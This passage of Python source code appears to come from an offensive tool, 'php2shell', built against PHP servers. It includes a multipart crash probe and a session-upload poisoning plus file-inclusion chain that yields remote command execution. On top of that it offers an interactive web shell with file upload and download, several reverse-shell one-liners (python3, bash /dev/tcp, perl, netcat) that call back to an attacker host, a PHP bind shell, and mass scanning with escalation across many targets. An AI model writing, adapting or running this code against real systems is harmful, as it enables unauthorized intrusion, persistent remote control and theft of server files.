                result["status"] = int(first.split(" ")[1])
            except (ValueError, IndexError):
                pass
    except socket.timeout:            result["error"] = "TIMEOUT"
    except ConnectionResetError:      result["error"] = "CONNECTION_RESET"
    except ConnectionRefusedError:    result["error"] = "CONNECTION_REFUSED"
    except BrokenPipeError:           result["error"] = "BROKEN_PIPE"
    except OSError as exc:            result["error"] = f"OS_ERROR: {exc}"
    finally:
        sock.close()
    return result


def _uaf_classify(result):
    err, status = result.get("error"), result.get("status")
    if err in ("CONNECTION_RESET", "BROKEN_PIPE"): return "CRASH_LIKELY",    C.BRED
    if err == "TIMEOUT":                           return "HANG_OR_CRASH",   C.BYLW
    if err == "CONNECTION_REFUSED":                return "REFUSED",         C.DIM
    if err:                                        return f"ERROR ({err})",  C.DIM
    if status in (502, 503):                       return "WORKER_DEAD",     C.BRED
    if status == 200:                              return "OK",              C.BGRN
    if status:                                     return f"HTTP_{status}",  C.DIM
    if result["bytes"] == 0:                       return "EMPTY",           C.BYLW
    return "UNKNOWN", C.DIM


def run_uaf(target_url, variants=None, repeat=1, timeout=5.0, verbose=False, output_json=False):
    _print_module_start(
        "Multipart Parser UAF Crash Probe", "CVE-2026-109618 / CVE-2026-109619",
        "Malformed multipart payloads via raw sockets - classifies crash signals"
    )

    parsed  = urlparse(target_url)
    host    = parsed.hostname
    port    = parsed.port or (443 if parsed.scheme == "https" else 80)
    path    = parsed.path or "/"
    use_tls = parsed.scheme == "https"
    selected = variants or list(_UAF_VARIANTS.keys())

    _kv("Target",   f"{host}:{port}{path}")
    _kv("Variants", ", ".join(selected))
    _kv("Repeat",   f"{repeat}x")
    _blank()

    cols   = ["Variant", "Bytes", "Attempt", "Verdict", "Signal"]
    widths = [16, 8, 8, 16, 30]
    _table_header(cols, widths)

    results = {}
    all_count = sum(len(range(repeat)) for _ in selected)
    done = 0

    for name in selected:
        desc, build_fn = _UAF_VARIANTS[name]
        body, ct = build_fn()
        run_results = []

        for attempt in range(repeat):
            res    = _send_raw(host, port, path, body, ct, use_tls=use_tls, timeout=timeout)
            verdict, color = _uaf_classify(res)
            run_results.append(verdict)

            signal = ""
            if verdict in ("CRASH_LIKELY", "WORKER_DEAD"):
                signal = f"{C.BRED}← potential UAF trigger{C.RST}"
            elif verdict == "HANG_OR_CRASH":
                signal = f"{C.BYLW}← possible crash{C.RST}"
            elif verdict == "OK":
                signal = f"{C.DIM}no anomaly{C.RST}"

            _table_row(
                [name, str(len(body)), f"#{attempt+1}", verdict, signal],
                widths,
                [C.BCYN, C.DIM, C.DIM, color, C.DIM],
            )

            if verbose and res.get("error"):
                print(f"{'':22s}{C.DIM}error: {res['error']}{C.RST}")
            elif verbose and res.get("raw"):
                print(f"{'':22s}{C.DIM}{res['raw'][:120].replace(chr(10),'↵')}{C.RST}")

            done += 1
            time.sleep(0.3)

        results[name] = run_results

    _blank()
    _hline()
    _blank()

    if output_json:
        print(json.dumps(results, indent=2))
        return results

    crash_variants = [
        (n, sum(1 for v in vs if v in ("CRASH_LIKELY","WORKER_DEAD","HANG_OR_CRASH")), len(vs))
        for n, vs in results.items() if any(v in ("CRASH_LIKELY","WORKER_DEAD","HANG_OR_CRASH") for v in vs)
    ]

    if crash_variants:
        print(f"  {_result_badge('CRASH LIKELY')}")
        _blank()
        _fail("Potential vulnerability signals detected:")
        for n, c, t in crash_variants:
            _bullet(f"{n}: {c}/{t} abnormal responses  {C.DIM}({_UAF_VARIANTS[n][0]}){C.RST}")
        _blank()
        _info("Next steps:")
        _bullet("Check PHP-FPM error logs for segfault / signal 11")
        _bullet("Run with --repeat 5 to confirm consistency")
        _bullet("Use 'exploit' subcommand for the full RCE chain")
    else:
        print(f"  {_result_badge('PATCHED')}")
        _blank()
        _ok("No crashes detected across all variants")
        _bullet("Target PHP may be patched (>= 8.4.27), or a WAF is filtering requests")
        _bullet("Try different --variant combinations or increase --repeat")
    _blank()
    return results


def _print_summary(r618, r619, rexp):
    _blank()
    _section("Assessment Summary")
    _blank()

    vuln_618 = r618 is True
    vuln_619 = r619 is True
    vuln_exp = rexp is True

    items = [
        ("CVE-2026-109618", "Zend OOM Bailout",
         _result_badge("VULNERABLE") if vuln_618 else _result_badge("PATCHED")),
        ("CVE-2026-109619", "Pre-RINIT Deserialisation",
         _result_badge("VULNERABLE") if vuln_619 else _result_badge("PATCHED")),
        ("LFI Exploit Chain", "Session Upload Poisoning",
         _result_badge("RCE CONFIRMED") if vuln_exp else _result_badge("NOT EXPLOITABLE")),
    ]

    for cve, name, badge in items:
        print(f"    {C.BOLD}{cve:<20}{C.RST} {C.DIM}{name:<32}{C.RST} {badge}")

    _blank()
    _hline("─", 78)
    _blank()

    overall = vuln_618 or vuln_619 or vuln_exp
    if overall:
        print(f"    {C.BRED}✖{C.RST}  {C.BRED}{C.BOLD}TARGET IS VULNERABLE{C.RST}  {C.DIM}Upgrade to PHP >= 8.4.27 recommended{C.RST}")
    else:
        print(f"    {C.BGRN}✔{C.RST}  {C.BGRN}{C.BOLD}TARGET APPEARS PATCHED{C.RST}  {C.DIM}No vulnerability vectors succeeded{C.RST}")
    _blank()


_SH_MARKER_S = "<!--sh:s-->"
_SH_MARKER_E = "<!--sh:e-->"
_SH_CWD_S    = "<!--cwd:s-->"
_SH_CWD_E    = "<!--cwd:e-->"


def _sh_payload(cmd, cwd=None):
    """
    Build a PHP payload that:
      1. cd's to cwd if given
      2. runs cmd via shell_exec
      3. echos cwd and output between fixed markers
    """
    import base64 as _b64
    cd_part  = ""
    if cwd:
        safe_cwd = _b64.b64encode(cwd.encode()).decode()
        cd_part  = f"chdir(base64_decode('{safe_cwd}'));"
    safe_cmd = _b64.b64encode(cmd.encode()).decode()
    return (
        _SH_MARKER_S
        + "<?php "
        + cd_part
        + f"echo '{_SH_CWD_S}'.getcwd().'{_SH_CWD_E}';"
        + f"echo shell_exec(base64_decode('{safe_cmd}'));"
        + " ?>"
        + _SH_MARKER_E
    )


def _sh_parse(body):
    """Extract (cwd, output) from response body."""
    s = body.find(_SH_MARKER_S)
    e = body.find(_SH_MARKER_E)
    if s == -1 or e == -1:
        return None, None
    inner = body[s + len(_SH_MARKER_S): e]
    if "<?php" in inner:
        return None, None

    cwd_s = inner.find(_SH_CWD_S)
    cwd_e = inner.find(_SH_CWD_E)
    cwd    = inner[cwd_s + len(_SH_CWD_S): cwd_e].strip() if cwd_s != -1 else None
    output = inner[cwd_e + len(_SH_CWD_E):] if cwd_e != -1 else inner
    return cwd, output


def _sh_exec(base, cmd, cwd,
             session_path=_DEFAULT_SESS_PATH,
             upload_ep=_DEFAULT_UPLOAD_EP,
             lfi_ep=_DEFAULT_LFI_EP,
             lfi_param=_DEFAULT_LFI_PARAM):
    """Inject payload + trigger LFI, return (new_cwd, output, error)."""
    sid       = _rand(26)
    sess_file = f"{session_path}/sess_{sid}"
    payload   = _sh_payload(cmd, cwd)

    http = _http("shell")
    http.cookies.set("PHPSESSID", sid)
    try:
        r = http.post(
            base + upload_ep,
            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
            files={"file": ("x", io.BytesIO(b"\x00" * 512), "application/octet-stream")},
            timeout=12,
        )
        if r.status_code != 200:
            return cwd, None, f"Inject POST failed: HTTP {r.status_code}"
    except requests.RequestException as exc:
        return cwd, None, f"Inject error: {exc}"
    finally:
        http.close()

    http2 = _http("shell")
    try:
        r2 = http2.get(base + lfi_ep, params={lfi_param: sess_file}, timeout=15)
        new_cwd, out = _sh_parse(r2.text)
        if new_cwd is None and out is None:
            return cwd, None, "No markers in response - session may have been cleaned up"
        return new_cwd or cwd, out or "", None
    except requests.RequestException as exc:
        return cwd, None, f"LFI error: {exc}"
    finally:
        http2.close()


def _sh_upload_file(base, local_path, remote_path, cwd,
                    session_path, upload_ep, lfi_ep, lfi_param):
    """Read local file and write it to remote via echo > payload."""
    try:
        data = open(local_path, "rb").read()
    except OSError as exc:
        return f"Cannot read local file: {exc}"
    import base64 as _b64
    b64  = _b64.b64encode(data).decode()
    cmd  = f"file_put_contents('{remote_path}', base64_decode('{b64}'));"

    sid       = _rand(26)
    sess_file = f"{session_path}/sess_{sid}"
    marker_s  = "<!--up:s-->"
    marker_e  = "<!--up:e-->"
    payload   = (
        marker_s
        + "<?php " + cmd + f" echo '{marker_s}OK{marker_e}'; ?>"
        + marker_e
    )
    http = _http("shell-upload")
    http.cookies.set("PHPSESSID", sid)
    try:
        http.post(
            base + upload_ep,
            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
            files={"file": ("x", io.BytesIO(b"\x00"), "application/octet-stream")},
            timeout=12,
        )
    except Exception as exc:
        return str(exc)
    finally:
        http.close()

    http2 = _http("shell-upload")
    try:
        r = http2.get(base + lfi_ep, params={lfi_param: sess_file}, timeout=10)
        if "OK" in r.text:
            return None
        return "Upload payload executed but no OK marker returned"
    except Exception as exc:
        return str(exc)
    finally:
        http2.close()


def _sh_download_file(base, remote_path, local_path, cwd,
                      session_path, upload_ep, lfi_ep, lfi_param):
    """Download a remote file via base64-encoded read."""
    cmd = f"base64_encode(file_get_contents('{remote_path}'))"

    import base64 as _b64
    inner_cmd = f"cat {remote_path} | base64"
    new_cwd, out, err = _sh_exec(
        base, inner_cmd, cwd, session_path, upload_ep, lfi_ep, lfi_param
    )
    if err:
        return err
    if not out or not out.strip():
        return "Empty response - file may not exist or is not readable"
    try:
        decoded = _b64.b64decode(out.strip())
        with open(local_path, "wb") as f:
            f.write(decoded)
        return None
    except Exception as exc:
        return f"Decode/write error: {exc}"


_REVSHELL_PAYLOADS = [

    (
        "python3",
        "python3 -c \""
        "import socket,subprocess,os,pty;"
        "s=socket.socket();"
        "s.connect(('{lhost}',{lport}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn('/bin/bash')"
        "\"",
    ),

    (
        "bash",
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    ),

    (
        "perl",
        "perl -e \""
        "use Socket;"
        "$i='{lhost}';"
        "$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));"
        "connect(S,sockaddr_in($p,inet_aton($i)));"
        "open(STDIN,'>&S');"
        "open(STDOUT,'>&S');"
        "open(STDERR,'>&S');"
        "exec('/bin/bash -i')"
        "\"",
    ),

    (
        "nc-mkfifo",
        "rm /tmp/.p2s_f;mkfifo /tmp/.p2s_f;"
        "cat /tmp/.p2s_f|/bin/bash -i 2>&1"
        "|nc {lhost} {lport} >/tmp/.p2s_f",
    ),
]


def _inject_cmd_bg(base, shell_cmd,
                   session_path=_DEFAULT_SESS_PATH,
                   upload_ep=_DEFAULT_UPLOAD_EP,
                   lfi_ep=_DEFAULT_LFI_EP,
                   lfi_param=_DEFAULT_LFI_PARAM):
    """
    Fire-and-forget: inject a command that runs in the background
    via `nohup ... &`. Does NOT wait for output.
    """
    bg_cmd  = f"nohup bash -c {repr(shell_cmd)} >/dev/null 2>&1 &"
    sid       = _rand(26)
    sess_file = f"{session_path}/sess_{sid}"
    import base64 as _b64
    enc     = _b64.b64encode(bg_cmd.encode()).decode()
    payload = (
        "<!--bg:s-->"
        f"<?php shell_exec(base64_decode('{enc}')); ?>"
        "<!--bg:e-->"
    )
    http = _http("revshell")
    http.cookies.set("PHPSESSID", sid)
    try:
        http.post(
            base + upload_ep,
            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
            files={"file": ("x", io.BytesIO(b"\x00" * 256), "application/octet-stream")},
            timeout=10,
        )
        http2 = _http("revshell")
        http2.get(base + lfi_ep, params={lfi_param: sess_file}, timeout=8)
        http2.close()
    except Exception:
        pass
    finally:
        http.close()


def _pty_upgrade_instructions(lhost, lport):
    """Print PTY upgrade steps for a dumb netcat shell."""
    _blank()
    _hline("─", 70, C.DIM)
    print(f"  {C.BOLD}{C.BCYN}PTY Upgrade Steps{C.RST}  {C.DIM}(run inside netcat session after connect){C.RST}")
    _hline("─", 70, C.DIM)
    steps = [
        ("1", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
               "spawn a pty"),
        ("2", "Ctrl+Z",
               "background nc"),
        ("3", "stty raw -echo; fg",
               "disable local echo, bring nc back"),
        ("4", "export TERM=xterm-256color",
               "enable colours + clear"),
        ("5", "stty rows 40 cols 200",
               "fix terminal size (adjust to yours)"),
    ]
    for n, cmd, desc in steps:
        print(f"  {C.BYLW}[{n}]{C.RST}  {C.BWHT}{cmd:<52}{C.RST}  {C.DIM}# {desc}{C.RST}")
    _hline("─", 70, C.DIM)
    _blank()


def escalate_reverse_shell(
        base, lhost, lport,
        session_path=_DEFAULT_SESS_PATH,
        upload_ep=_DEFAULT_UPLOAD_EP,
        lfi_ep=_DEFAULT_LFI_EP,
        lfi_param=_DEFAULT_LFI_PARAM,
        payload_type="auto",
):
    """
    Inject a reverse shell payload via session-poisoning + LFI,
    then display nc listener instructions + PTY upgrade steps.

    payload_type: 'auto' | 'python3' | 'bash' | 'perl' | 'nc-mkfifo'
    """
    _print_module_start(
        "Reverse Shell Escalation", "Post-Exploitation",
        f"{lhost}:{lport}  ←  target connects back",
    )

    if payload_type == "auto":
        payloads = _REVSHELL_PAYLOADS
    else:
        payloads = [(p[0], p[1]) for p in _REVSHELL_PAYLOADS if p[0] == payload_type]
        if not payloads:
            _fail(f"Unknown payload type '{payload_type}'")
            return False

    _info(f"Listener :  {_c('nc -lvnp ' + str(lport), C.BYLW)}")
    _info(f"LHOST    :  {_c(lhost, C.BCYN)}")
    _info(f"LPORT    :  {_c(str(lport), C.BCYN)}")
    _blank()

    print(f"  {C.BOLD}Run this on your machine BEFORE injecting:{C.RST}")
    print(f"  {C.BG_BLK}{C.BGRN}  nc -lvnp {lport}  {C.RST}")
    _blank()

    input(f"  {C.DIM}Press ENTER when your listener is ready …{C.RST} ")
    _blank()

    for name, template in payloads:
        cmd = template.format(lhost=lhost, lport=lport)
        _info(f"Trying payload: {_c(name, C.BYLW)}…")
        if name == "bash":

            cmd = f"bash -c '{cmd}'"
        _inject_cmd_bg(
            base, cmd, session_path, upload_ep, lfi_ep, lfi_param,
        )
        _ok(f"Payload injected ({name})")
        _info("Waiting 3s for connect-back …")
        time.sleep(3)


        print()
        print(f"  {C.BYLW}✔ Check your netcat window now.{C.RST}")
        _blank()

        ans = input(
            f"  {C.BCYN}Did you get a shell?{C.RST} {C.DIM}[y/N]{C.RST}: "
        ).strip().lower()
        if ans in ("y", "yes"):
            _ok("Shell received!")
            _pty_upgrade_instructions(lhost, lport)
            return True

        _warn(f"Payload '{name}' did not connect - trying next …")
        _blank()

    _fail("All payloads exhausted - no connect-back received")
    _bullet("Check firewall rules allow inbound on port " + str(lport))
    _bullet("Try a different LHOST (your reachable IP from the target)")
    return False


_BIND_PHP = """
<?php
$port   = {port};
$sock   = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
socket_bind($sock, '0.0.0.0', $port);
socket_listen($sock);
$client = socket_accept($sock);
$desc   = array(0 => $client, 1 => $client, 2 => $client);
while (true) {{
    $cmd = socket_read($client, 4096);
    if (!$cmd) break;
    $out = shell_exec(trim($cmd));
    socket_write($client, $out);
}}
socket_close($sock);
?>
"""


def escalate_bind_shell(
        base, bind_port,
        session_path=_DEFAULT_SESS_PATH,
        upload_ep=_DEFAULT_UPLOAD_EP,
        lfi_ep=_DEFAULT_LFI_EP,
        lfi_param=_DEFAULT_LFI_PARAM,
):
    """
    Write a PHP bind shell script to /tmp on the target via
    session-poisoning + file_put_contents, then execute it in
    the background and connect to it with a raw socket.
    """
    _print_module_start(
        "Bind Shell Escalation", "Post-Exploitation",
        f"target opens TCP:{bind_port} → we connect",
    )

    parsed = urlparse(base)
    target_host = parsed.hostname
    import base64 as _b64

    _kv("Target host", target_host)
    _kv("Bind port",   str(bind_port))
    _blank()


    php_src  = _BIND_PHP.format(port=bind_port)
    b64_src  = _b64.b64encode(php_src.encode()).decode()
    write_cmd = f"file_put_contents('/tmp/.p2s_bs.php',base64_decode('{b64_src}'));"
    with Spinner("Writing bind shell PHP to /tmp/.p2s_bs.php"):
        _inject_cmd_bg(base,
            f"php -r \"{write_cmd}\"",
            session_path, upload_ep, lfi_ep, lfi_param)
        time.sleep(1)
    _ok("Bind shell script written")


    with Spinner(f"Launching bind shell listener on port {bind_port}"):
        _inject_cmd_bg(base,
            f"php /tmp/.p2s_bs.php",
            session_path, upload_ep, lfi_ep, lfi_param)
        time.sleep(2)
    _ok("Listener started")


    _info(f"Connecting to {target_host}:{bind_port} …")
    _blank()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        sock.connect((target_host, int(bind_port)))
        sock.settimeout(None)
    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
        _fail(f"Connection failed: {exc}")
        _bullet("Check target firewall allows outbound on " + str(bind_port))
        _bullet("Check php socket_create/socket_bind are not disabled in php.ini")
        return False

    _ok(f"Connected to {target_host}:{bind_port}")
    _blank()


    w = min(_term_width(), 100)
    _hline("═", w, C.BRED)
    print(f"  {C.BRED}{C.BOLD}◈  BIND SHELL{C.RST}  "
          f"{C.DIM}{target_host}:{bind_port}  |  type 'exit' to close{C.RST}")
    _hline("═", w, C.BRED)
    _blank()

    try:
        while True:
            try:
                raw = input(f"  {C.BRED}bind:{C.RST}{C.BCYN}{target_host}{C.RST}$ ")
            except (KeyboardInterrupt, EOFError):
                print()
                break
            cmd = raw.strip()
            if not cmd:
                continue
            if cmd in ("exit", "quit", "q"):
                break
            try:
                sock.sendall((cmd + "\n").encode())
                time.sleep(0.4)
                sock.settimeout(5)
                out = b""
                while True:
                    try:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        out += chunk
                    except socket.timeout:
                        break
                sock.settimeout(None)
                for line in out.decode("utf-8", errors="replace").rstrip("\n").splitlines():
                    print(f"  {C.BWHT}{line}{C.RST}")
            except (BrokenPipeError, ConnectionResetError):
                _fail("Connection lost")
                break
            _blank()
    finally:
        sock.close()
        _info("Bind shell connection closed")

    return True


def _upgrade_menu(base,
                  session_path=_DEFAULT_SESS_PATH,
                  upload_ep=_DEFAULT_UPLOAD_EP,
                  lfi_ep=_DEFAULT_LFI_EP,
                  lfi_param=_DEFAULT_LFI_PARAM):
    """
    Interactive menu to choose between reverse shell and bind shell escalation.
    Called from inside the HTTP shell REPL via the 'upgrade' command.
    """
    w = min(_term_width(), 100)
    _blank()
    _hline("═", w, C.BMAG)
    print(f"  {C.BMAG}{C.BOLD}⚡  STABLE SHELL ESCALATION{C.RST}  "
          f"{C.DIM}current shell is stateless HTTP - upgrade to a real TTY{C.RST}")
    _hline("─", w, C.DIM)
    print(f"  {C.BYLW}{C.BOLD}[1]{C.RST}  {C.BWHT}Reverse Shell{C.RST}  "
          f"{C.DIM}target connects to you  |  needs inbound port open on YOUR machine{C.RST}")
    print(f"  {C.BYLW}{C.BOLD}[2]{C.RST}  {C.BWHT}Bind Shell{C.RST}    "
          f"{C.DIM}we connect to target    |  needs a port open on TARGET{C.RST}")
    print(f"  {C.DIM}[q]{C.RST}  Cancel")
    _hline("═", w, C.BMAG)
    _blank()

    try:
        choice = input(f"  {C.BCYN}Select method{C.RST} {C.DIM}(1/2/q){C.RST}: ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        print()
        return

    if choice == "q":
        return

    if choice == "1":
        try:
            lhost = input(f"  {C.BCYN}Your IP (LHOST){C.RST}: ").strip()
            lport = int(input(f"  {C.BCYN}Your port (LPORT){C.RST}: ").strip())
        except (ValueError, KeyboardInterrupt):
            _fail("Invalid input")
            return
        _blank()
        print(f"  {C.DIM}Payload order: python3 → bash → perl → nc-mkfifo{C.RST}")
        _blank()
        escalate_reverse_shell(
            base, lhost, lport,
            session_path=session_path,
            upload_ep=upload_ep,
            lfi_ep=lfi_ep,
            lfi_param=lfi_param,
        )

    elif choice == "2":
        try:
            default_port = 4445
            raw_port = input(
                f"  {C.BCYN}Bind port on target{C.RST} "
                f"{C.DIM}[default: {default_port}]{C.RST}: "
            ).strip()
            bind_port = int(raw_port) if raw_port else default_port
        except (ValueError, KeyboardInterrupt):
            _fail("Invalid port")
            return
        _blank()
        escalate_bind_shell(
            base, bind_port,
            session_path=session_path,
            upload_ep=upload_ep,
            lfi_ep=lfi_ep,
            lfi_param=lfi_param,
        )
    else:
        _warn("Invalid choice")


def _sh_banner(base, cwd):
    w = min(_term_width(), 100)
    _blank()
    _hline("═", w, C.BRED)
    print(f"  {C.BRED}{C.BOLD}◈  INTERACTIVE HTTP SHELL{C.RST}   "
          f"{C.DIM}via Session Upload Progress + LFI{C.RST}")
    print(f"  {C.DIM}Target  :{C.RST}  {C.BYLW}{base}{C.RST}")
    print(f"  {C.DIM}CWD     :{C.RST}  {C.BCYN}{cwd or '?'}{C.RST}")
    _hline("─", w, C.DIM)
    print(f"  {C.DIM}Built-in commands:{C.RST}")
    cmds = [
        ("help",                     "show this help"),
        ("upgrade",                  "escalate to stable PTY (reverse/bind shell)"),
        ("exit / quit / q",          "leave the shell"),
        ("back",                     "return to target picker (bulk scan mode)"),
        ("switch <url>",             "jump to a different target's shell"),
        ("upload <local> <remote>",  "upload a local file to the target"),
        ("download <remote> <local>","download a remote file locally"),
        ("clear",                    "clear the screen"),
    ]
    for cmd_name, desc in cmds:
        print(f"  {C.BCYN}{cmd_name:<32}{C.RST}{C.DIM}{desc}{C.RST}")
    _hline("═", w, C.BRED)
    _blank()


def _sh_prompt(cwd, target_host):
    """Render the shell prompt line."""
    host = target_host.replace("http://","").replace("https://","").split("/")[0]
    cwd_display = cwd or "?"
    return (
        f"{C.DIM}[{C.RST}"
        f"{C.BGRN}php2shell{C.RST}"
        f"{C.DIM}@{C.RST}"
        f"{C.BYLW}{host}{C.RST}"
        f"{C.DIM}:{C.RST}"
        f"{C.BCYN}{cwd_display}{C.RST}"
        f"{C.DIM}]{C.RST} {C.BRED}${C.RST} "
    )


def run_shell(base,
             session_path=_DEFAULT_SESS_PATH,
             upload_ep=_DEFAULT_UPLOAD_EP,
             lfi_ep=_DEFAULT_LFI_EP,
             lfi_param=_DEFAULT_LFI_PARAM,
             auto_escalate=False):
    """
    Interactive HTTP shell over the session-poisoning + LFI vector.

    If auto_escalate=True, first verifies the exploit chain works,
    then drops straight into the shell prompt.
    """
    _print_module_start(
        "Interactive HTTP Shell", "Post-Exploitation",
        "Persistent shell loop via session upload progress + LFI"
    )


    if auto_escalate:
        _info("Running pre-flight exploit check before opening shell …")
        ok = run_exploit(
            base, cmd="id",
            session_path=session_path,
            upload_ep=upload_ep,
            lfi_ep=lfi_ep,
            lfi_param=lfi_param,
        )
        if not ok:
            _fail("Pre-flight RCE check failed - shell cannot be opened")
            _bullet("Run 'exploit --check' to diagnose the target configuration")
            return False
        _ok("RCE confirmed - escalating to interactive shell")
        _blank()


    with Spinner("Probing initial working directory"):
        cwd, out, err = _sh_exec(
            base, "pwd", None,
            session_path, upload_ep, lfi_ep, lfi_param,
        )

    if err:
        _fail(f"Initial probe failed: {err}")
        _bullet("Ensure upload_progress is ON and session dir is writable")
        return False

    _ok(f"Shell responsive - cwd: {_c(cwd or '?', C.BCYN)}")  
    _sh_banner(base, cwd)


    history      = []
    history_idx  = 0

    try:
        import readline
        readline.set_history_length(500)
    except ImportError:
        readline = None


    while True:
        try:
            prompt = _sh_prompt(cwd, base)

            raw = input(prompt)
        except (KeyboardInterrupt, EOFError):
            print()
            _info("Shell closed (KeyboardInterrupt)")
            break

        cmd = raw.strip()
        if not cmd:
            continue


        if cmd in ("exit", "quit", "q"):
            _info("Shell closed")
            return "exit"

        if cmd == "back":
            _info("Returning to target menu …")
            return "back"

        if cmd.startswith("switch"):
            parts = cmd.split(None, 1)
            if len(parts) == 2:
                new_url = parts[1].strip().rstrip("/")
                _info(f"Switching to {_c(new_url, C.BYLW)} …")
                return ("switch", new_url)
            _warn("Usage: switch <url>")
            continue

        if cmd == "help":
            _sh_banner(base, cwd)
            continue

        if cmd == "upgrade":
            _upgrade_menu(
                base,
                session_path=session_path,
                upload_ep=upload_ep,
                lfi_ep=lfi_ep,
                lfi_param=lfi_param,
            )
            continue

        if cmd == "clear":
            os.system("clear")
            continue

        if cmd.startswith("upload "):
            parts = cmd.split()
            if len(parts) != 3:
                _warn("Usage: upload <local_path> <remote_path>")
                continue
            _, local_p, remote_p = parts
            with Spinner(f"Uploading {local_p} → {remote_p}"):
                err = _sh_upload_file(
                    base, local_p, remote_p, cwd,
                    session_path, upload_ep, lfi_ep, lfi_param,
                )
            if err:
                _fail(f"Upload failed: {err}")
            else:
                _ok(f"Uploaded → {remote_p}")
            continue

        if cmd.startswith("download "):
            parts = cmd.split()
            if len(parts) != 3:
                _warn("Usage: download <remote_path> <local_path>")
                continue
            _, remote_p, local_p = parts
            with Spinner(f"Downloading {remote_p} → {local_p}"):
                err = _sh_download_file(
                    base, remote_p, local_p, cwd,
                    session_path, upload_ep, lfi_ep, lfi_param,
                )
            if err:
                _fail(f"Download failed: {err}")
            else:
                _ok(f"Saved → {local_p}")
            continue


        if cmd.startswith("cd"):
            parts = cmd.split(None, 1)
            target_dir = parts[1].strip() if len(parts) > 1 else "/"

            real_cmd = f"cd {target_dir} && pwd"
            with Spinner("changing directory"):
                new_cwd, out, err = _sh_exec(
                    base, real_cmd, cwd,
                    session_path, upload_ep, lfi_ep, lfi_param,
                )
            if err:
                _fail(err)
            elif out and out.strip():
                cwd = out.strip().splitlines()[0]
            else:
                _warn("cd: no output - directory may not exist")
            continue


        history.append(cmd)
        t_start = time.time()

        new_cwd, out, err = _sh_exec(
            base, cmd, cwd,
            session_path, upload_ep, lfi_ep, lfi_param,
        )

        elapsed = time.time() - t_start

        if err:
            _fail(err)
            continue

        if new_cwd:
            cwd = new_cwd

        if out is not None:
            for line in out.rstrip("\n").splitlines():
                print(f"  {C.BWHT}{line}{C.RST}")
        else:
            _warn("(empty output)")


        print(f"  {C.DIM}[{elapsed:.2f}s]{C.RST}")
        _blank()

    return "exit"


import concurrent.futures as _futures


def _quick_vuln_check(base,
                       upload_ep=_DEFAULT_UPLOAD_EP,
                       lfi_ep=_DEFAULT_LFI_EP,
                       lfi_param=_DEFAULT_LFI_PARAM):
    """
    Fast single-target check: returns dict with keys
      url, upload_on, lfi_works, rce_confirmed, error
    Does NOT open a shell. Designed to run in a thread pool.
    """
    result = dict(
        url=base, upload_on=False, lfi_works=False,
        rce_confirmed=False, php_version=None, error=None,
    )
    try:
        info = _exploit_recon(base)
        result["php_version"] = info.get("php_version")
        result["upload_on"]   = info.get("upload_progress_enabled") in ("1", "On", "on")
        result["lfi_works"]   = info.get("lfi_works", False)

        if not info["reachable"]:
            result["error"] = "unreachable"
            return result

        if result["upload_on"] and result["lfi_works"]:

            out = run_exploit(
                base, cmd="echo php2shell_ok",
                upload_ep=upload_ep,
                lfi_ep=lfi_ep,
                lfi_param=lfi_param,
            )
            result["rce_confirmed"] = bool(out)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _bulk_scan_print_table(results):
    """Print a color-coded result table for bulk scan output."""
    cols   = ["#", "URL", "PHP", "upload_progress", "LFI", "RCE"]
    widths = [3, 42, 8, 16, 7, 16]
    _blank()
    _table_header(cols, widths)

    vuln_targets = []
    for i, r in enumerate(results, 1):
        url   = r["url"]
        php   = r.get("php_version") or "?"
        up    = f"{C.BGRN}ON{C.RST}"  if r["upload_on"]    else f"{C.BRED}OFF{C.RST}"
        lfi   = f"{C.BGRN}YES{C.RST}" if r["lfi_works"]    else f"{C.BRED}NO{C.RST}"
        err   = r.get("error")

        if err:
            rce_str = f"{C.DIM}ERR: {err[:18]}{C.RST}"
            idx_col = C.DIM
        elif r["rce_confirmed"]:
            rce_str = f"{C.BRED}{C.BOLD}✘ VULNERABLE{C.RST}"
            idx_col = C.BRED
            vuln_targets.append((i, r))
        else:
            rce_str = f"{C.BGRN}✔ PATCHED{C.RST}"
            idx_col = C.DIM

        _table_row(
            [str(i), url[:42], php, "", "", ""],
            widths,
            [idx_col, C.BYLW if r["rce_confirmed"] else C.DIM,
             C.DIM, C.DIM, C.DIM, C.DIM],
        )

        print(f"  {'':3}  {'':42}  {'':8}  {up:<22}  {lfi:<13}  {rce_str}")
        _blank()

    _hline()
    return vuln_targets


def _target_picker(vuln_targets, all_results):
    """
    Interactive numbered menu.
    Returns chosen result dict, or None to exit.
    """
    if not vuln_targets:
        _warn("No vulnerable targets found - nothing to escalate")
        return None

    w = min(_term_width(), 100)
    _blank()
    _hline("═", w, C.BRED)
    print(f"  {C.BRED}{C.BOLD}⚡  VULNERABLE TARGETS  -  SELECT TO ESCALATE{C.RST}")
    _hline("─", w, C.DIM)
    for rank, (orig_idx, r) in enumerate(vuln_targets, 1):
        php = r.get("php_version") or "?"
        print(f"  {C.BYLW}{C.BOLD}[{rank}]{C.RST}  "
              f"{C.BWHT}{r['url']}{C.RST}  "
              f"{C.DIM}PHP {php}{C.RST}")
    print(f"  {C.DIM}[a]{C.RST}  Escalate ALL in sequence")
    print(f"  {C.DIM}[q]{C.RST}  Quit")
    _hline("═", w, C.BRED)
    _blank()

    while True:
        try:
            choice = input(
                f"  {C.BCYN}Select target{C.RST} "
                f"{C.DIM}(1-{len(vuln_targets)} / a / q){C.RST}: "
            ).strip().lower()
        except (KeyboardInterrupt, EOFError):
            print()
            return None

        if choice in ("q", "quit", "exit"):
            return None

        if choice == "a":
            return "all"

        try:
            n = int(choice)
            if 1 <= n <= len(vuln_targets):
                return vuln_targets[n - 1][1]
        except ValueError:
            pass

        _warn(f"Invalid choice - enter 1-{len(vuln_targets)}, 'a', or 'q'")


def _escalation_loop(chosen, vuln_targets,
                     upload_ep, lfi_ep, lfi_param, session_path):
    """
